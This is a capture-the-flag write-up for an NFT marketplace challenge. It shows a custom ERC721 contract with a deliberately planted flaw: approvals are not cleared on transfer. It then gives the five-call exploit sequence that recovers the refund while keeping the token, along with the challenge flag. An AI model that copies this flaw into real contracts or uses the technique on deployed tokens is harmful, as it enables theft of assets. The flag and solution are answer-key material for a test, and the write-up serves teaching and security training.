# FrontierMarketplace

---
5<sup>th</sup> Dec 2024 \
Prepared By: perrythepwner \
Challenge Author(s): perrythepwner \
Difficulty: <font color=orange>Medium</font>

---

# TLDR
This challenge consists on exploiting a custom ERC721 implementation that doesn't clear approvals after token ownership transfer, and can be leveraged by approving an account in control, selling the NFT and reclaming ownership again after transfer because of the non cleared approval.

# Description
> In the lawless expanses of the Frontier Board, digital ./assets hold immense value and power. Among these ./assets, the FrontierNFTs are the most sought-after, representing unique and valuable items that can influence the balance of power within the cluster.  
This government has managed to win a lot of approval and consensus from the people, through a strong propaganda campaign through their "FrontierNFT" which is receiving a lot of demand. Your goal is to somehow disrupt the political ride of the Frontier Board party.

# Skills Required
- Basic understanding of Solidity and smart contracts
- Interaction with smart contracts
- Familiarity with ERC721 standard

# Skills Learned
- Identifying vulnerabilities in custom ERC721 implementations

# Challenge Scenario
In the untamed territories ruled by the Frontier Board, digital ./assets possess immense value and authority. Among these ./assets, FrontierNFTs are the most coveted, representing unique and valuable items that can significantly influence the balance of power within the cluster.  
The Frontier Board has successfully garnered widespread approval and consensus from the populace through a robust propaganda campaign centered around their "FrontierNFT," which is experiencing unprecedented demand. Your mission is to disrupt the political dominance of the Frontier Board by hacking the FrontierNFT contract.

# Analyzing the Source Code
The challenge provides the source code of the following contracts to players.

## `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FrontierMarketplace } from "./FrontierMarketplace.sol";
import { FrontierNFT } from "./FrontierNFT.sol";

contract Setup {
    FrontierMarketplace public immutable TARGET;
    uint256 public constant PLAYER_STARTING_BALANCE = 20 ether;
    uint256 public constant NFT_VALUE = 10 ether;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new FrontierMarketplace();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return (
            address(msg.sender).balance > PLAYER_STARTING_BALANCE - NFT_VALUE && 
            FrontierNFT(TARGET.frontierNFT()).balanceOf(msg.sender) > 0
        );
    }
}
```

The Setup contract deploys the `FrontierNFT` and `FrontierMarketplace` contracts. In order to solve this challenge, the player must have a balance > of 10 ethers while also having at least one FrontierNFT token.

## `FrontierMarketplace.sol`
The FrontierMarketplace contract serves as "frontend" for the NFT contract, we'll see why later. Here's an overview of the code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FrontierNFT } from "./FrontierNFT.sol";

contract FrontierMarketplace {
    uint256 public constant TOKEN_VALUE = 10 ether;
    FrontierNFT public frontierNFT;
    address public owner;

    event NFTMinted(address indexed buyer, uint256 indexed tokenId);
    event NFTRefunded(address indexed seller, uint256 indexed tokenId);

    constructor() {
        frontierNFT = new FrontierNFT(address(this));
        owner = msg.sender;
    }

    function buyNFT() public payable returns (uint256) {
        require(msg.value == TOKEN_VALUE, "FrontierMarketplace: Incorrect payment amount");
        uint256 tokenId = frontierNFT.mint(msg.sender);
        emit NFTMinted(msg.sender, tokenId);
        return tokenId;
    }
    
    function refundNFT(uint256 tokenId) public {
        require(frontierNFT.ownerOf(tokenId) == msg.sender, "FrontierMarketplace: Only owner can refund NFT");
        frontierNFT.transferFrom(msg.sender, address(this), tokenId);
        payable(msg.sender).transfer(TOKEN_VALUE);
        emit NFTRefunded(msg.sender, tokenId);
    }
}

```

The marketplace exposes two functions to users:
- **`buyNFT()` function**: a payable function, users can mint to themselves 1 `FrontierNFT` token by paying 10 ethers.
- **`refundNFT` function**: users can also get a refund of the NFT token, by giving allowance to the marketplace to transfer the token back to the marketplace balance, in change of getting the full refund of the token value (10 ethers).

At the moment, nothing seems off, we understand that maybe the solution involves buying an NFT and request a refund for it (to get the ethers back) but somehow still owning the NFT after the refund. Let's see how the FrontierNFT token contracts looks like.

## `FrontierNFT.sol`
The FrontierNFT is a custom ERC721 standard, which looks pretty similar to the actual standard at first glance:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FrontierNFT {
    string public name = "FrontierNFT";
    string public symbol = "FRNT";
    
    uint256 private _tokenId = 1;
    address private _marketplace;
    mapping(uint256 tokenId => address) private _owners;
    mapping(address owner => uint256) private _balances;
    mapping(uint256 tokenId => address) private _tokenApprovals;
    mapping(address owner => mapping(address operator => bool)) private _operatorApprovals;

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    modifier onlyMarketplace() {
        require(msg.sender == _marketplace, "FrontierNFT: caller is not authorized");
        _;
    }

    constructor(address marketplace) {
        _marketplace = marketplace;
    }

    function balanceOf(address owner) public view returns (uint256) {
        require(owner != address(0), "FrontierNFT: invalid owner address");
        return _balances[owner];
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "FrontierNFT: queried owner for nonexistent token");
        return owner;
    }

    function approve(address to, uint256 tokenId) public {
        address owner = ownerOf(tokenId);
        require(msg.sender == owner, "FrontierNFT: approve caller is not the owner");
        _tokenApprovals[tokenId] = to;
        emit Approval(owner, to, tokenId);
    }

    function getApproved(uint256 tokenId) public view returns (address) {
        require(_owners[tokenId] != address(0), "FrontierNFT: queried approvals for nonexistent token");
        return _tokenApprovals[tokenId];
    }

    function setApprovalForAll(address operator, bool approved) public {
        require(operator != address(0), "FrontierNFT: invalid operator");
        _operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function isApprovedForAll(address owner, address operator) public view returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        require(to != address(0), "FrontierNFT: invalid transfer receiver");
        require(from == ownerOf(tokenId), "FrontierNFT: transfer of token that is not own");
        require(
            msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
            "FrontierNFT: transfer caller is not owner nor approved"
        );

        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(from, to, tokenId);
    }

    function mint(address to) public onlyMarketplace returns (uint256) {
        uint256 currentTokenId = _tokenId;
        _mint(to, currentTokenId);
        return currentTokenId;
    }

    function burn(uint256 tokenId) public onlyMarketplace {
        _burn(tokenId);
    }

    function _mint(address to, uint256 tokenId) internal {
        require(to != address(0), "FrontierNFT: invalid mint receiver");
        require(_owners[tokenId] == address(0), "FrontierNFT: token already minted");

        _balances[to] += 1;
        _owners[tokenId] = to;
        _tokenId += 1;

        emit Transfer(address(0), to, tokenId);
    }

    function _burn(uint256 tokenId) internal {
        address owner = ownerOf(tokenId);
        require(msg.sender == owner, "FrontierNFT: caller is not the owner");
        _balances[owner] -= 1;
        delete _owners[tokenId];

        emit Transfer(owner, address(0), tokenId);
    }
}
```

A player can notice immediately that the modifier `onlyMarketplace` is applied to some functions, in particular to the `mint` and `burn` functions. The `onlyMarketplace` effectively verify that the transaction sender is the `FrontierMarketplace` contract, meaning that players won't be able to mint directly to themselves the tokens by interacting directly with the NFT contract and call it a day.  
We can then deduce that `FrontierMarketplace` is only the "frontend" and the `FrontierNFT` contract is the backend, with some authentication.

At this point, some vulnerability needs to be found in FrontierNFT contract. A player can do a full review of the code with no problems, since most of the functions are viewers/getters, and analyze the more critical functions like `transferFrom`, `setApprovalForAll` and `approve` functions.  
What can also be done, is comparing this implementation with some field-standard implementation like the [OpenZeppelin ERC721 contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol).

At high level, most of the functions will look very similar, if not identical. Openzeppelin contracts do also some magic to optimize gas consumption, but security wise speaking, the checks made are the same.  
The only exception is made for the `approve` function implementation, which looks quite different:

`openzeppelin/contracts/token/ERC721/ERC721.sol:_approve`
```solidity
function _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {
    // Avoid reading the owner unless necessary
    if (emitEvent || auth != address(0)) {
        address owner = _requireOwned(tokenId);

        // We do not use _isAuthorized because single-token approvals should not be able to call approve
        if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {
            revert ERC721InvalidApprover(auth);
        }

        if (emitEvent) {
            emit Approval(owner, to, tokenId);
        }
    }

    _tokenApprovals[tokenId] = to;
}
```

`FrontierNFT.sol:approve`
```solidity
function approve(address to, uint256 tokenId) public {
    address owner = ownerOf(tokenId);
    require(msg.sender == owner, "FrontierNFT: approve caller is not the owner");
    _tokenApprovals[tokenId] = to;
    emit Approval(owner, to, tokenId);
}
```

## NFT contract allows parallel token-specific and collection approvals  
Looking at them side by side, we notice the missing `auth` parameter, that in OZ implementation enables another layer of security; we can notice also that both of the implementation require the sender to be the owner of the `tokenId` we want to approve for address `to`. Both sets the `_tokenApprovals` mapping and emit the `Approval` but the OZ implementation checks for zero address and for `isApprovedForAll`.  
In the `FrontierNFT` contract the zero address check is being made in the `ownerOf` function, so the only actual missing check is the following line:

```solidity
!isApprovedForAll(owner, auth)
``` 

That means we can both emit a single-user approval for given `tokenId` but also allowing an address to have approval for an arbitrary token in the meantime...How that could be useful?  
The `setApprovalForAll` function looks the same on both contracts, meaning we need to investigate further and keep in mind that missing check.  

## `transferFrom` doesn't clear approvals after token ownership transfer
The only missing function to analyze is the one responsible for transferring tokens. Let's put them side by side.

`openzeppelin/contracts/token/ERC721/ERC721.sol:_transfer`
```solidity
/**
* @dev Transfers `tokenId` from `from` to `to`.
*  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.
*
* Requirements:
*
* - `to` cannot be the zero address.
* - `tokenId` token must be owned by `from`.
*
* Emits a {Transfer} event.
*/
function _transfer(address from, address to, uint256 tokenId) internal {
    if (to == address(0)) {
        revert ERC721InvalidReceiver(address(0));
    }
    address previousOwner = _update(to, tokenId, address(0));
    if (previousOwner == address(0)) {
        revert ERC721NonexistentToken(tokenId);
    } else if (previousOwner != from) {
        revert ERC721IncorrectOwner(from, tokenId, previousOwner);
    }
}
```

`FrontierNFT.sol:transferFrom`
```solidity
function transferFrom(address from, address to, uint256 tokenId) public {
    require(to != address(0), "FrontierNFT: invalid transfer receiver");
    require(from == ownerOf(tokenId), "FrontierNFT: transfer of token that is not own");
    require(
        msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
        "FrontierNFT: transfer caller is not owner nor approved"
    );

    _balances[from] -= 1;
    _balances[to] += 1;
    _owners[tokenId] = to;

    emit Transfer(from, to, tokenId);
}
```

As the Natspec says in the OZ implementation, the `to` parameter cannot be zero address and `from` address must have ownership of the token is being transferred. Both checks happen in the `FrontierNFT` implemenation also.  
Notice how the OZ `_transfer` calls internally another internal function: `_update`, so let's analyze it also.
```solidity
/**
* @dev Transfers `tokenId` from its current owner to `to`, or alternatively mints (or burns) if the current owner
* (or `to`) is the zero address. Returns the owner of the `tokenId` before the update.
*
* The `auth` argument is optional. If the value passed is non 0, then this function will check that
* `auth` is either the owner of the token, or approved to operate on the token (by the owner).
*
* Emits a {Transfer} event.
*
* NOTE: If overriding this function in a way that tracks balances, see also {_increaseBalance}.
*/
function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) {
    address from = _ownerOf(tokenId);

    // Perform (optional) operator check
    if (auth != address(0)) {
        _checkAuthorized(from, auth, tokenId);
    }

    // Execute the update
    if (from != address(0)) {
        // Clear approval. No need to re-authorize or emit the Approval event
        _approve(address(0), tokenId, address(0), false);

        unchecked {
            _balances[from] -= 1;
        }
    }

    if (to != address(0)) {
        unchecked {
            _balances[to] += 1;
        }
    }

    _owners[tokenId] = to;

    emit Transfer(from, to, tokenId);

    return from;
}
```

Again, the operator checks are almost the same, but this time one more action is being made on the OZ implemenation:
```solidity
        // Clear approval. No need to re-authorize or emit the Approval event
        _approve(address(0), tokenId, address(0), false);
```

The `FrontierNFT` transfer function, does not clear approvals indeed.  
How can we exploit this? Think of the following scenario:

1) Player buys an NFT for `10 ethers` through the FrontierMarketplace instance, he becomes owner of tokenId `1`. Player balance is now `10 ethers`.
2) Player approve himself for tokenId `1`.
3) Player also set approval for all tokens in his possession for `FrontierMarketplace` as operator. This is allowed by the missing check in the `approve` function and allows `FrontierMarketplace` to move tokens while keeping valid the previous self-approval.
4) Player asks for refund, `FrontierMarketplace` regain ownership of tokenId `1` and players receive back `10 ethers`. Player balance is now `20 ethers` again.
5) Player calls `transferFrom` for himself of tokenId `1`, despite having no ownership, thanks to the dangling approval set at step 2.
6) Player has the initial balance of `20 ethers` but got 1 free FrontierNFT token, and can repeat from step 1 indefinitely.

# Exploitation

To reproduce the scenario, a player must perform the following sequence of action:
```py
[...]
    csend(target_addr, "buyNFT()", "--value", "10ether")
    csend(frontierNFT, "approve(address,uint256)", player_addr, "1")
    csend(frontierNFT, "setApprovalForAll(address,bool)", target_addr, "true")
    csend(target_addr, "refundNFT(uint256)", "1")
    csend(frontierNFT, "transferFrom(address,address,uint256)", target_addr, player_addr, "1")
```

see the full exploitation script [here](./htb/solver.py).

---
> HTB{g1mme_1t_b4ck}
